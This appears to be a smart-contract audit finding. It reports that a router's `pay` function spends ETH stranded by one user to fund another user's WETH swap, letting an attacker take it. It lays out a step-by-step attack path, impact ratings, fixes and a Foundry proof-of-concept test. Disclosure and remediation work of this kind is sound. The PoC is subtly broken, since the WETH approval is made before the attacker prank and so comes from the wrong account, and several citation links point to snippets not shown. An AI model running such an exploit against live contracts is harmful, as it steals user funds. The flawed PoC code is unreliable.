### Title
Cross-User ETH Theft via Unattributed Router Native Balance in `PeripheryPayments.pay` Partial-ETH Branch — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay` contains a partial-ETH branch that blindly consumes **all** native ETH held by the router to partially fund any WETH swap, regardless of which user deposited that ETH. An attacker who observes stranded ETH on the router can craft a WETH swap with only partial approval and steal the stranded ETH.

---

### Finding Description

The `pay` function has three branches for WETH payments: [1](#0-0) 

The middle branch (`nativeBalance > 0 && nativeBalance < value`) at lines 78–81 is the root cause:

```solidity
} else if (nativeBalance > 0) {
    IWETH9(WETH).deposit{value: nativeBalance}();
    IERC20(WETH).safeTransfer(recipient, nativeBalance);
    IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
}
```

It deposits and forwards **the entire router ETH balance** toward the current caller's swap, then pulls only the shortfall from `payer`. There is no attribution: the ETH consumed here may belong to a prior user.

**How ETH becomes stranded:** `multicall` is `payable`, so users send ETH via `multicall{value: X}(exactInputSingle(..., amountIn: Y))` where `X > Y`. The excess `X - Y` ETH remains on the router after the call if the user omits `refundETH()`. The test suite explicitly documents this pattern and the need for `refundETH()`: [2](#0-1) 

The `receive()` guard only blocks direct ETH pushes; it does not prevent ETH from accumulating via `payable` function calls: [3](#0-2) 

**Attack path:**

1. User A calls `multicall{value: 1 ETH}([exactInputSingle(tokenIn=WETH, amountIn=0.5 ETH)])` without `refundETH()`. After the call, **0.5 ETH is stranded** on the router.
2. Attacker B calls `exactInputSingle(tokenIn=WETH, amountIn=1 ETH, msg.value=0)` with only **0.5 WETH approved**.
3. The pool calls back into `metricOmmSwapCallback` → `_justPayCallback` → `pay(WETH, attackerB, pool, 1 ETH)`:
   - `nativeBalance = 0.5 ETH` → branch `nativeBalance > 0 && < 1 ETH` fires
   - Router deposits user A's 0.5 ETH → transfers 0.5 WETH to pool
   - Router pulls 0.5 WETH from attacker B → transfers to pool
4. Pool receives the full 1 ETH worth of WETH. Attacker B's swap succeeds. **User A's 0.5 ETH is permanently consumed.** [4](#0-3) [5](#0-4) 

---

### Impact Explanation

Direct, cross-user theft of stranded ETH principal. User A loses ETH they sent to the router; attacker B receives a subsidized swap. The stolen amount equals the stranded ETH balance, which can be any value up to the full `msg.value` of user A's prior call. This is a High-severity direct loss of user funds.

---

### Likelihood Explanation

Medium-High. The precondition (ETH stranded on the router) is a well-known user error in Uniswap v3-style routers — users frequently send excess ETH without including `refundETH()`. The attack is permissionless, requires no privileged access, and can be executed in the very next block after ETH is stranded. An attacker can monitor the mempool or router balance and act immediately.

---

### Recommendation

The `pay` function must not consume ETH that was not sent by the current caller in the current transaction. Two complementary fixes:

1. **Track per-call ETH:** Store `msg.value` in transient storage at the start of each `exactInput*`/`exactOutput*` entry point and deduct from it in `pay`, reverting if the current call's ETH budget is exhausted.
2. **Enforce `msg.value == amountIn` for ETH swaps:** In `exactInputSingle` (and analogous entry points), when `tokenIn == WETH`, require `msg.value == 0 || msg.value == amountIn` and only allow the partial-ETH branch to consume ETH that arrived in the current call.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Foundry fork test sketch
function test_crossUserEthTheft() public {
    uint128 amountIn = 1 ether;
    uint256 strandedEth = 0.5 ether;

    // User A: sends 1 ETH but only swaps 0.5 ETH, forgets refundETH()
    vm.prank(userA);
    bytes[] memory calls = new bytes[](1); // no refundETH
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        ExactInputSingleParams({
            pool: pool, tokenIn: WETH, tokenOut: token1,
            zeroForOne: true, amountIn: uint128(strandedEth),
            amountOutMinimum: 0, recipient: userA,
            deadline: type(uint256).max, priceLimitX64: 0, extensionData: ""
        })
    );
    router.multicall{value: amountIn}(calls);
    // 0.5 ETH now stranded on router

    assertEq(address(router).balance, strandedEth, "ETH stranded");

    // Attacker B: approves only 0.5 WETH, sends 0 ETH, requests 1 ETH swap
    weth.approve(address(router), strandedEth); // only half
    vm.prank(attackerB);
    router.exactInputSingle(
        ExactInputSingleParams({
            pool: pool, tokenIn: WETH, tokenOut: token1,
            zeroForOne: true, amountIn: uint128(amountIn), // full 1 ETH
            amountOutMinimum: 0, recipient: attackerB,
            deadline: type(uint256).max, priceLimitX64: 0, extensionData: ""
        })
    );
    // Attacker B's swap succeeds; user A's 0.5 ETH consumed
    assertEq(address(router).balance, 0, "user A's ETH stolen");
}
```
